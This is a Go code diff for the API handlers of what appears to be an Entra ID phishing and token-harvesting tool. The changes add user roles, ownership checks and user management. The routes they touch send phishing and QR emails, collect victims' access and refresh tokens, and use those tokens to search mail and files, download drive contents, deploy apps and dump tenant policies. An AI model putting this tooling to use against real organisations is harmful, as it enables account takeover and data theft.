@@ -14,6 +14,7 @@ import (
 	"github.com/bl4cksku11/entraith/internal/auth"
 	"github.com/bl4cksku11/entraith/internal/campaigns"
 	"github.com/bl4cksku11/entraith/internal/mailer"
+	"github.com/bl4cksku11/entraith/internal/modules/devicecode"
 	"github.com/bl4cksku11/entraith/internal/modules/devicereg"
 	"github.com/bl4cksku11/entraith/internal/modules/graph"
 	mfapkg "github.com/bl4cksku11/entraith/internal/modules/mfa"
@@ -42,7 +43,53 @@ func NewHandler(mgr *campaigns.Manager, mail *mailer.Manager, webhookLogPath str
 	}
 }
 
-// authMiddleware validates session cookies for all /api/* routes except /api/auth/login.
+type ctxKey string
+
+const userCtxKey ctxKey = "session_user"
+
+type sessionUser struct {
+	ID                 string
+	Username           string
+	Role               string
+	MustChangePassword bool
+}
+
+func userFromCtx(r *http.Request) *sessionUser {
+	u, _ := r.Context().Value(userCtxKey).(*sessionUser)
+	return u
+}
+
+func writeUnauthorized(w http.ResponseWriter) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusUnauthorized)
+	json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
+}
+
+func (h *Handler) requireAdmin(w http.ResponseWriter, r *http.Request) bool {
+	u := userFromCtx(r)
+	if u == nil || u.Role != "admin" {
+		writeError(w, 403, "admin required")
+		return false
+	}
+	return true
+}
+
+// adminIDSet returns a set of user IDs that have the admin role.
+// Used for RBAC filtering: operators can access resources owned by any admin.
+func (h *Handler) adminIDSet() map[string]bool {
+	ids, err := h.Store.ListAdminUserIDs()
+	if err != nil {
+		return map[string]bool{}
+	}
+	set := make(map[string]bool, len(ids))
+	for _, id := range ids {
+		set[id] = true
+	}
+	return set
+}
+
+// authMiddleware validates session cookies for all /api/* routes except public endpoints.
+// On success it loads the user from DB and attaches a *sessionUser to the request context.
 func (h *Handler) authMiddleware(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		// Pass through non-API paths (webhook receiver etc.)
@@ -50,26 +97,33 @@ func (h *Handler) authMiddleware(next http.Handler) http.Handler {
 			next.ServeHTTP(w, r)
 			return
 		}
-		// Login endpoint is public
-		if r.URL.Path == "/api/auth/login" {
+		// Public endpoints
+		if r.URL.Path == "/api/auth/login" || r.URL.Path == "/api/auth/change-password" {
 			next.ServeHTTP(w, r)
 			return
 		}
 		cookie, err := r.Cookie("session")
 		if err != nil || cookie.Value == "" {
-			w.Header().Set("Content-Type", "application/json")
-			w.WriteHeader(http.StatusUnauthorized)
-			json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
+			writeUnauthorized(w)
 			return
 		}
 		sess, err := h.Store.GetSession(cookie.Value)
 		if err != nil || sess == nil || time.Now().After(sess.ExpiresAt) {
-			w.Header().Set("Content-Type", "application/json")
-			w.WriteHeader(http.StatusUnauthorized)
-			json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
+			writeUnauthorized(w)
 			return
 		}
-		next.ServeHTTP(w, r)
+		user, err := h.Store.GetUserByID(sess.UserID)
+		if err != nil || user == nil {
+			writeUnauthorized(w)
+			return
+		}
+		ctx := context.WithValue(r.Context(), userCtxKey, &sessionUser{
+			ID:                 user.ID,
+			Username:           user.Username,
+			Role:               user.Role,
+			MustChangePassword: user.MustChangePassword,
+		})
+		next.ServeHTTP(w, r.WithContext(ctx))
 	})
 }
 
@@ -80,11 +134,21 @@ func (h *Handler) Routes() http.Handler {
 	mux.HandleFunc("POST /api/auth/login", h.authLogin)
 	mux.HandleFunc("POST /api/auth/logout", h.authLogout)
 	mux.HandleFunc("GET /api/auth/check", h.authCheck)
+	mux.HandleFunc("POST /api/auth/change-password", h.changePassword)
+
+	// User management (admin only)
+	mux.HandleFunc("GET /api/users", h.listUsers)
+	mux.HandleFunc("POST /api/users", h.createUser)
+	mux.HandleFunc("PUT /api/users/{id}", h.updateUser)
+	mux.HandleFunc("DELETE /api/users/{id}", h.deleteUser)
+	mux.HandleFunc("POST /api/users/{id}/reset-password", h.resetUserPassword)
 
 	// Campaign routes
 	mux.HandleFunc("GET /api/campaigns", h.listCampaigns)
 	mux.HandleFunc("POST /api/campaigns", h.createCampaign)
 	mux.HandleFunc("GET /api/campaigns/{id}", h.getCampaign)
+	mux.HandleFunc("PATCH /api/campaigns/{id}", h.renameCampaign)
+	mux.HandleFunc("POST /api/campaigns/{id}/duplicate", h.duplicateCampaign)
 	mux.HandleFunc("GET /api/campaigns/{id}/status", h.getCampaignStatus)
 	mux.HandleFunc("POST /api/campaigns/{id}/launch", h.launchCampaign)
 	mux.HandleFunc("POST /api/campaigns/{id}/stop", h.stopCampaign)
@@ -207,6 +271,7 @@ func (h *Handler) Routes() http.Handler {
 
 	// Token exchange
 	mux.HandleFunc("POST /api/campaigns/{id}/tokens/{targetId}/exchange", h.tokenExchange)
+	mux.HandleFunc("POST /api/campaigns/{id}/tokens/{targetId}/exchange-refresh", h.refreshExchangedToken)
 
 	// Utility
 	mux.HandleFunc("POST /api/util/tenant-lookup", h.utilTenantLookup)
@@ -250,7 +315,6 @@ func (h *Handler) Routes() http.Handler {
 
 	// Webhook / telemetry receiver
 	mux.HandleFunc("POST /receive", h.receiveWebhook)
-	mux.HandleFunc("POST /intune/capture", h.CaptureIntune)
 
 	// Webhook listener control — registered at root (not /api/) for external access
 	mux.HandleFunc("GET /webhook/status", h.webhookStatus)
@@ -326,7 +390,12 @@ func (h *Handler) authLogin(w http.ResponseWriter, r *http.Request) {
 		SameSite: http.SameSiteStrictMode,
 		MaxAge:   86400,
 	})
-	writeJSON(w, 200, map[string]string{"status": "ok", "username": user.Username})
+	writeJSON(w, 200, map[string]interface{}{
+		"status":               "ok",
+		"username":             user.Username,
+		"role":                 user.Role,
+		"must_change_password": user.MustChangePassword,
+	})
 }
 
 func (h *Handler) authLogout(w http.ResponseWriter, r *http.Request) {
@@ -344,14 +413,197 @@ func (h *Handler) authLogout(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) authCheck(w http.ResponseWriter, r *http.Request) {
-	// If we get here, auth middleware already validated the session.
+	u := userFromCtx(r)
+	if u == nil {
+		writeUnauthorized(w)
+		return
+	}
+	writeJSON(w, 200, map[string]interface{}{
+		"status":               "ok",
+		"username":             u.Username,
+		"role":                 u.Role,
+		"must_change_password": u.MustChangePassword,
+	})
+}
+
+// --- User management handlers ---
+
+func (h *Handler) changePassword(w http.ResponseWriter, r *http.Request) {
+	cookie, err := r.Cookie("session")
+	if err != nil || cookie.Value == "" {
+		writeError(w, 401, "unauthorized")
+		return
+	}
+	sess, err := h.Store.GetSession(cookie.Value)
+	if err != nil || sess == nil || time.Now().After(sess.ExpiresAt) {
+		writeError(w, 401, "unauthorized")
+		return
+	}
+	var body struct {
+		CurrentPassword string `json:"current_password"`
+		NewPassword     string `json:"new_password"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.NewPassword == "" {
+		writeError(w, 400, "new_password required")
+		return
+	}
+	user, err := h.Store.GetUserByID(sess.UserID)
+	if err != nil || user == nil {
+		writeError(w, 401, "unauthorized")
+		return
+	}
+	if !user.MustChangePassword {
+		if body.CurrentPassword == "" || !auth.VerifyPassword(body.CurrentPassword, user.PasswordHash, user.Salt) {
+			writeError(w, 401, "current password incorrect")
+			return
+		}
+	}
+	if len(body.NewPassword) < 8 {
+		writeError(w, 400, "password must be at least 8 characters")
+		return
+	}
+	newSalt := auth.GenerateSalt()
+	newHash := auth.HashPassword(body.NewPassword, newSalt)
+	if err := h.Store.UpdateUserPasswordByID(sess.UserID, newHash, newSalt, false); err != nil {
+		writeError(w, 500, "failed to update password")
+		return
+	}
+	writeJSON(w, 200, map[string]string{"status": "ok"})
+}
+
+func (h *Handler) listUsers(w http.ResponseWriter, r *http.Request) {
+	if !h.requireAdmin(w, r) {
+		return
+	}
+	users, err := h.Store.ListUsers()
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	type userOut struct {
+		ID                 string    `json:"id"`
+		Username           string    `json:"username"`
+		Role               string    `json:"role"`
+		MustChangePassword bool      `json:"must_change_password"`
+		CreatedAt          time.Time `json:"created_at"`
+	}
+	out := make([]userOut, len(users))
+	for i, u := range users {
+		out[i] = userOut{ID: u.ID, Username: u.Username, Role: u.Role, MustChangePassword: u.MustChangePassword, CreatedAt: u.CreatedAt}
+	}
+	writeJSON(w, 200, out)
+}
+
+func (h *Handler) createUser(w http.ResponseWriter, r *http.Request) {
+	if !h.requireAdmin(w, r) {
+		return
+	}
+	var body struct {
+		Username string `json:"username"`
+		Password string `json:"password"`
+		Role     string `json:"role"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Username == "" || body.Password == "" {
+		writeError(w, 400, "username and password required")
+		return
+	}
+	if body.Role != "admin" && body.Role != "operator" {
+		body.Role = "operator"
+	}
+	existing, _ := h.Store.GetUserByUsername(body.Username)
+	if existing != nil {
+		writeError(w, 409, "username already exists")
+		return
+	}
+	id := "user-" + auth.GenerateToken()[:12]
+	salt := auth.GenerateSalt()
+	hash := auth.HashPassword(body.Password, salt)
+	if err := h.Store.CreateUserFull(id, body.Username, hash, salt, body.Role, true); err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	writeJSON(w, 201, map[string]string{"id": id, "username": body.Username, "role": body.Role})
+}
+
+func (h *Handler) updateUser(w http.ResponseWriter, r *http.Request) {
+	if !h.requireAdmin(w, r) {
+		return
+	}
+	id := r.PathValue("id")
+	var body struct {
+		Username           string `json:"username"`
+		Role               string `json:"role"`
+		MustChangePassword bool   `json:"must_change_password"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		writeError(w, 400, "invalid body")
+		return
+	}
+	if body.Role != "admin" && body.Role != "operator" {
+		writeError(w, 400, "role must be admin or operator")
+		return
+	}
+	if err := h.Store.UpdateUserByID(id, body.Username, body.Role, body.MustChangePassword); err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	writeJSON(w, 200, map[string]string{"status": "ok"})
+}
+
+func (h *Handler) deleteUser(w http.ResponseWriter, r *http.Request) {
+	if !h.requireAdmin(w, r) {
+		return
+	}
+	id := r.PathValue("id")
+	u := userFromCtx(r)
+	if u != nil && u.ID == id {
+		writeError(w, 400, "cannot delete your own account")
+		return
+	}
+	if err := h.Store.DeleteUser(id); err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	writeJSON(w, 200, map[string]string{"status": "ok"})
+}
+
+func (h *Handler) resetUserPassword(w http.ResponseWriter, r *http.Request) {
+	if !h.requireAdmin(w, r) {
+		return
+	}
+	id := r.PathValue("id")
+	var body struct {
+		Password string `json:"password"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Password == "" {
+		writeError(w, 400, "password required")
+		return
+	}
+	salt := auth.GenerateSalt()
+	hash := auth.HashPassword(body.Password, salt)
+	if err := h.Store.UpdateUserPasswordByID(id, hash, salt, true); err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	writeJSON(w, 200, map[string]string{"status": "ok"})
 }
 
 // --- Campaign handlers ---
 
 func (h *Handler) listCampaigns(w http.ResponseWriter, r *http.Request) {
+	u := userFromCtx(r)
 	all := h.Manager.AllCampaigns()
+	if u != nil && u.Role != "admin" {
+		adminIDs := h.adminIDSet()
+		filtered := make([]*campaigns.Campaign, 0)
+		for _, c := range all {
+			if c.OwnerID == u.ID || adminIDs[c.OwnerID] {
+				filtered = append(filtered, c)
+			}
+		}
+		writeJSON(w, 200, filtered)
+		return
+	}
 	writeJSON(w, 200, all)
 }
 
@@ -369,22 +621,90 @@ func (h *Handler) createCampaign(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	id := fmt.Sprintf("camp-%d", time.Now().UnixMilli())
-	c := h.Manager.NewCampaign(id, body.Name, body.Description)
+	ownerID := ""
+	if u := userFromCtx(r); u != nil {
+		ownerID = u.ID
+	}
+	c := h.Manager.NewCampaign(id, body.Name, body.Description, ownerID)
 	writeJSON(w, 201, c)
+}
+
+// campaignAccess returns the campaign if it exists and the current user can access it.
+func (h *Handler) campaignAccess(w http.ResponseWriter, r *http.Request, id string) (*campaigns.Campaign, bool) {
+	c, ok := h.Manager.GetCampaign(id)
+	if !ok {
+		writeError(w, 404, "campaign not found")
+		return nil, false
+	}
+	u := userFromCtx(r)
+	if u != nil && u.Role != "admin" {
+		adminIDs := h.adminIDSet()
+		if c.OwnerID != u.ID && !adminIDs[c.OwnerID] {
+			writeError(w, 403, "access denied")
+			return nil, false
+		}
+	}
+	return c, true
 }
 
 func (h *Handler) getCampaign(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
-	c, ok := h.Manager.GetCampaign(id)
+	c, ok := h.campaignAccess(w, r, id)
 	if !ok {
-		writeError(w, 404, "campaign not found")
 		return
 	}
 	writeJSON(w, 200, c)
 }
 
+func (h *Handler) renameCampaign(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	c, ok := h.campaignAccess(w, r, id)
+	if !ok {
+		return
+	}
+	var body struct {
+		Name        string `json:"name"`
+		Description string `json:"description"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		writeError(w, 400, "invalid body")
+		return
+	}
+	c.Rename(body.Name, body.Description)
+	h.Manager.Save(c)
+	writeJSON(w, 200, c)
+}
+
+func (h *Handler) duplicateCampaign(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	src, ok := h.campaignAccess(w, r, id)
+	if !ok {
+		return
+	}
+	ownerID := ""
+	if u := userFromCtx(r); u != nil {
+		ownerID = u.ID
+	}
+	newID := fmt.Sprintf("camp-%d", time.Now().UnixMilli())
+	newName := src.Name + " (copy)"
+	nc := h.Manager.NewCampaign(newID, newName, src.Description, ownerID)
+	// Copy targets — assign new IDs so they are independent of the source campaign.
+	for _, t := range src.Targets.All() {
+		clone := *t // copy by value
+		clone.ID = ""
+		if err := nc.Targets.Add(&clone); err == nil {
+			h.Manager.SaveTargetToDB(newID, &clone)
+		}
+	}
+	h.Manager.Save(nc)
+	writeJSON(w, 201, nc)
+}
+
 func (h *Handler) getCampaignStatus(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	status, err := h.Manager.GetStatus(id)
 	if err != nil {
 		writeError(w, 404, err.Error())
@@ -395,6 +715,9 @@ func (h *Handler) getCampaignStatus(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) launchCampaign(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	if err := h.Manager.Launch(id); err != nil {
 		writeError(w, 400, err.Error())
 		return
@@ -405,6 +728,9 @@ func (h *Handler) launchCampaign(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) stopCampaign(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	if err := h.Manager.Stop(id); err != nil {
 		writeError(w, 400, err.Error())
 		return
@@ -414,19 +740,40 @@ func (h *Handler) stopCampaign(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) getTokens(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	tokens, err := h.Manager.GetTokens(id)
 	if err != nil {
 		writeError(w, 404, err.Error())
 		return
+	}
+	// Append exchanged tokens so the UI can show and re-use them.
+	if exchanged, err := h.Store.LoadExchangedTokens(id); err == nil {
+		for _, ex := range exchanged {
+			tokens = append(tokens, &devicecode.TokenResult{
+				AccessToken:  ex.AccessToken,
+				RefreshToken: ex.RefreshToken,
+				Scope:        ex.Scope,
+				ExpiresIn:    devicecode.FlexInt(ex.ExpiresIn),
+				TargetID:     ex.TargetID,
+				TargetEmail:  ex.TargetEmail,
+				RedeemedAt:   ex.ObtainedAt,
+				TenantID:     ex.TenantID,
+				Label:        ex.Label,
+				Source:       "exchange",
+				ReqScope:     ex.ReqScope,
+				ReqResource:  ex.ReqResource,
+			})
+		}
 	}
 	writeJSON(w, 200, tokens)
 }
 
 func (h *Handler) getSessions(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
-	c, ok := h.Manager.GetCampaign(id)
+	c, ok := h.campaignAccess(w, r, id)
 	if !ok {
-		writeError(w, 404, "campaign not found")
 		return
 	}
 	sessions := map[string]interface{}{}
@@ -461,9 +808,8 @@ func (h *Handler) getSessions(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) importTargets(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
-	c, ok := h.Manager.GetCampaign(id)
+	c, ok := h.campaignAccess(w, r, id)
 	if !ok {
-		writeError(w, 404, "campaign not found")
 		return
 	}
 
@@ -497,9 +843,8 @@ func (h *Handler) importTargets(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) listTargets(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
-	c, ok := h.Manager.GetCampaign(id)
+	c, ok := h.campaignAccess(w, r, id)
 	if !ok {
-		writeError(w, 404, "campaign not found")
 		return
 	}
 	writeJSON(w, 200, c.Targets.All())
@@ -509,6 +854,9 @@ func (h *Handler) listTargets(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) sendEmails(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 
 	var body struct {
 		ProfileID  string `json:"profile_id"`
@@ -544,6 +892,9 @@ func (h *Handler) sendEmails(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) sendEmailToTarget(w http.ResponseWriter, r *http.Request) {
 	campaignID := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, campaignID); !ok {
+		return
+	}
 	targetID := r.PathValue("targetId")
 	var body struct {
 		ProfileID  string `json:"profile_id"`
@@ -577,6 +928,9 @@ func (h *Handler) sendEmailToTarget(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) sendQREmails(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		ProfileID    string `json:"profile_id"`
 		QRTemplateID string `json:"qr_template_id"`
@@ -615,7 +969,11 @@ func (h *Handler) sendQREmails(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) listQRScans(w http.ResponseWriter, r *http.Request) {
-	scans, err := h.Store.ListQRScans(r.PathValue("id"))
+	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
+	scans, err := h.Store.ListQRScans(id)
 	if err != nil {
 		writeError(w, 500, err.Error())
 		return
@@ -775,7 +1133,39 @@ func (h *Handler) getEmailResults(w http.ResponseWriter, r *http.Request) {
 // --- Sender profile handlers ---
 
 func (h *Handler) listProfiles(w http.ResponseWriter, r *http.Request) {
-	writeJSON(w, 200, h.Mailer.AllProfiles())
+	u := userFromCtx(r)
+	all := h.Mailer.AllProfiles()
+	if u != nil && u.Role != "admin" {
+		adminIDs := h.adminIDSet()
+		filtered := make([]*mailer.SenderProfile, 0)
+		for _, p := range all {
+			if p.OwnerID == u.ID || adminIDs[p.OwnerID] {
+				filtered = append(filtered, p)
+			}
+		}
+		writeJSON(w, 200, filtered)
+		return
+	}
+	writeJSON(w, 200, all)
+}
+
+// profileAccess returns the profile if the current user can access it.
+// Operators can access their own profiles and profiles owned by admins.
+func (h *Handler) profileAccess(w http.ResponseWriter, r *http.Request, id string) (*mailer.SenderProfile, bool) {
+	p, ok := h.Mailer.GetProfile(id)
+	if !ok {
+		writeError(w, 404, "profile not found")
+		return nil, false
+	}
+	u := userFromCtx(r)
+	if u != nil && u.Role != "admin" {
+		adminIDs := h.adminIDSet()
+		if p.OwnerID != u.ID && !adminIDs[p.OwnerID] {
+			writeError(w, 403, "access denied")
+			return nil, false
+		}
+	}
+	return p, true
 }
 
 func (h *Handler) createProfile(w http.ResponseWriter, r *http.Request) {
@@ -793,15 +1183,27 @@ func (h *Handler) createProfile(w http.ResponseWriter, r *http.Request) {
 	}
 	p.ID = fmt.Sprintf("prof-%d", time.Now().UnixMilli())
 	p.CreatedAt = time.Now().UTC()
+	if u := userFromCtx(r); u != nil {
+		p.OwnerID = u.ID
+	}
 	h.Mailer.SaveProfile(&p)
 	writeJSON(w, 201, p)
 }
 
 func (h *Handler) deleteProfile(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
-	if _, ok := h.Mailer.GetProfile(id); !ok {
-		writeError(w, 404, "profile not found")
+	p, ok := h.profileAccess(w, r, id)
+	if !ok {
 		return
+	}
+	// Operators may only delete their own profiles, not admin-created ones.
+	u := userFromCtx(r)
+	if u != nil && u.Role != "admin" {
+		adminIDs := h.adminIDSet()
+		if adminIDs[p.OwnerID] {
+			writeError(w, 403, "cannot delete admin-owned profile")
+			return
+		}
 	}
 	h.Mailer.DeleteProfile(id)
 	writeJSON(w, 200, map[string]string{"status": "deleted"})
@@ -809,9 +1211,8 @@ func (h *Handler) deleteProfile(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) testProfile(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
-	profile, ok := h.Mailer.GetProfile(id)
+	profile, ok := h.profileAccess(w, r, id)
 	if !ok {
-		writeError(w, 404, "profile not found")
 		return
 	}
 
@@ -890,6 +1291,9 @@ func (h *Handler) deleteTemplate(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) refreshToken(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	targetID := r.PathValue("targetId")
 	refreshed, err := h.Manager.RefreshToken(id, targetID)
 	if err != nil {
@@ -901,6 +1305,9 @@ func (h *Handler) refreshToken(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) downloadAccessToken(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	targetID := r.PathValue("targetId")
 	token, err := h.Manager.GetTokenByTargetID(id, targetID)
 	if err != nil {
@@ -915,6 +1322,9 @@ func (h *Handler) downloadAccessToken(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) downloadRefreshToken(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	targetID := r.PathValue("targetId")
 	token, err := h.Manager.GetTokenByTargetID(id, targetID)
 	if err != nil {
@@ -941,9 +1351,26 @@ func (h *Handler) graphClient(campaignID, targetID string) (*graph.Client, error
 	return graph.New(token.AccessToken), nil
 }
 
+// graphAccess enforces campaign ownership then returns an authenticated Graph client.
+func (h *Handler) graphAccess(w http.ResponseWriter, r *http.Request) (*graph.Client, bool) {
+	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return nil, false
+	}
+	gc, err := h.graphClient(id, r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return nil, false
+	}
+	return gc, true
+}
+
 func (h *Handler) graphSearchEmails(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		Query string `json:"query"`
 		Top   int    `json:"top"`
@@ -969,6 +1396,9 @@ func (h *Handler) graphSearchEmails(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphSearchFiles(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		Query string `json:"query"`
 		Top   int    `json:"top"`
@@ -992,9 +1422,8 @@ func (h *Handler) graphSearchFiles(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGetTeams(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetJoinedTeams(context.Background())
@@ -1007,9 +1436,8 @@ func (h *Handler) graphGetTeams(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGetChats(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetTeamsChats(context.Background())
@@ -1024,6 +1452,9 @@ func (h *Handler) graphGetChats(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphDeployApp(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		DisplayName     string   `json:"display_name"`
 		RedirectURI     string   `json:"redirect_uri"`
@@ -1048,9 +1479,8 @@ func (h *Handler) graphDeployApp(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphDiscoverMailboxes(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.DiscoverUsers(context.Background())
@@ -1063,9 +1493,8 @@ func (h *Handler) graphDiscoverMailboxes(w http.ResponseWriter, r *http.Request)
 }
 
 func (h *Handler) graphGetGroups(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroups(context.Background())
@@ -1078,9 +1507,8 @@ func (h *Handler) graphGetGroups(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGetOwnedGroups(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetOwnedGroups(context.Background())
@@ -1095,6 +1523,9 @@ func (h *Handler) graphGetOwnedGroups(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphCloneGroup(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		SourceGroupID  string `json:"source_group_id"`
 		NewDisplayName string `json:"new_display_name"`
@@ -1121,6 +1552,9 @@ func (h *Handler) graphCloneGroup(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphSearchUsers(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		Query string `json:"query"`
 	}
@@ -1144,9 +1578,8 @@ func (h *Handler) graphSearchUsers(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphDumpConditionalAccess(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.DumpConditionalAccessPolicies(context.Background())
@@ -1159,9 +1592,8 @@ func (h *Handler) graphDumpConditionalAccess(w http.ResponseWriter, r *http.Requ
 }
 
 func (h *Handler) graphDumpApps(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	apps, err := gc.DumpAppRegistrations(context.Background())
@@ -1187,9 +1619,8 @@ func (h *Handler) graphDumpApps(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGetGrants(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetOAuth2PermissionGrants(context.Background())
@@ -1204,6 +1635,9 @@ func (h *Handler) graphGetGrants(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphDriveLs(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	itemID := r.URL.Query().Get("item") // empty = root
 	gc, err := h.graphClient(id, targetID)
 	if err != nil {
@@ -1222,6 +1656,9 @@ func (h *Handler) graphDriveLs(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphDriveDownload(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	itemID := r.URL.Query().Get("item")
 	filename := r.URL.Query().Get("name")
 	if itemID == "" {
@@ -1252,9 +1689,8 @@ func (h *Handler) graphDriveDownload(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGetMe(w http.ResponseWriter, r *http.Request) {
